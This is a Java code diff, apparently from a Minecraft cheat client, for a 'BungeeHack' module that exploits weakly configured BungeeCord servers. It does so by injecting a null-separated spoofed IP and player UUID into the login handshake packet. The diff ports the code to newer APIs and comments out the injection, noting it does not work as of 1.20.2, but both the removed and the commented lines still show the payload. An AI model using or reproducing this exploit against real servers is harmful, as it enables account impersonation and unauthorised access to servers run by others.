@@ -8,15 +8,16 @@ import falsify.falsify.module.Category;
 import falsify.falsify.module.Module;
 import net.minecraft.client.MinecraftClient;
 import net.minecraft.network.NetworkState;
+import net.minecraft.network.packet.c2s.handshake.ConnectionIntent;
 import net.minecraft.network.packet.c2s.handshake.HandshakeC2SPacket;
 
 public class BungeeHack extends Module {
     final MinecraftClient mc = MinecraftClient.getInstance();
     public String ip = "1.2.3.4";
-    public String uuid = mc.getSession().getUuid().replace("-","");
+    public String uuid = mc.getSession().getUuidOrNull().toString().replace("-","");
 
     public BungeeHack() {
-        super("BungeeHack", "Exploit weak Bungee servers.", true, Category.MISC, -1);
+        super("BungeeHack", "Exploit weak Bungee servers. (Not Working as of 1.20.2)", true, Category.MISC, -1);
     }
 
     @Override
@@ -26,10 +27,9 @@ public class BungeeHack extends Module {
     @Override
     public void onEvent(Event<?> event) {
         if(event instanceof EventPacketSend){
-            if(((EventPacketSend) event).getPacket() instanceof HandshakeC2SPacket){
-                HandshakeC2SPacket p = (HandshakeC2SPacket) ((EventPacketSend) event).packet;
-                if(p.getIntendedState().equals(NetworkState.LOGIN)){
-                    ((MixinHandshakeC2SPacket)p).setAddress(((MixinHandshakeC2SPacket)p).getAddress() + "\000"+ip+"\000"+uuid);
+            if(((EventPacketSend) event).getPacket() instanceof HandshakeC2SPacket p){
+                if(p.intendedState().equals(ConnectionIntent.LOGIN)){
+//                    ((MixinHandshakeC2SPacket)p).setAddress(((MixinHandshakeC2SPacket)p).getAddress() + "\000"+ip+"\000"+uuid);
                 }
             }
         }
